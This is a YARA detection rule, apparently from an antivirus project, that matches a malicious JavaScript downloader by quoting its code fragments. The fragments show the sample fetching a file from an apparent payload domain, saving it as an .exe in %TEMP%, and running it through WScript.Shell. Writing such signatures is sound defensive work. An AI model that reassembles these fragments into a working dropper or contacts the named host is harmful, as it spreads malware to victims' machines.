rule sig_20160329_fa65a1eae6ee2a32ff413e7ed0a1ac89 {
  meta:
    description = "datamaliciousorder - file 20160329_fa65a1eae6ee2a32ff413e7ed0a1ac89.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "34bc7c66240889dfee5b434d37c5d0bad20886e2730e7cbbebff9dc950e80423"

  strings:
    $s1  = "I[lK](\"GET\", \"http://xn--kandypriv-j4a.com/lo4sad\", false);" fullword ascii
    $s2  = "function su() {return b0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"uzm0srP82.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[ya](E() * 11); if (I[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var b0 = function F() {return WScript[XX](\"WScript.Shell\");}(), Q = 11;" fullword ascii
    $s5  = "function Is(Y, AE){w0 = w0 * 1; return Y - AE;};" fullword ascii
    $s6  = "function NA(){return \"\" + qq;};" fullword ascii
    $s7  = "function B(wq){b0[\"Run\"](wq, w0, w0);};" fullword ascii
    $s8  = "function r() {return ((ph == true) && (ph == a)) ? 1 : w0;};" fullword ascii
    $s9  = "function u()" fullword ascii
    $s10 = " while (h){" fullword ascii
    $s11 = "function E(){return 22;};" fullword ascii
    $s12 = "var b = new this[\"Date\"]();" fullword ascii
    $s13 = "function QJ(N) {var J = (1, 2, 3, 4, 5, N); return J;};" fullword ascii
    $s14 = "return Is(T, D);" fullword ascii
    $s15 = "function w(){return XX;};" fullword ascii
    $s16 = "var a = false;" fullword ascii
    $s17 = "a = true; " fullword ascii
    $s18 = "var zN = false;" fullword ascii
    $s19 = "ph = true; " fullword ascii
    $s20 = "var ph = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}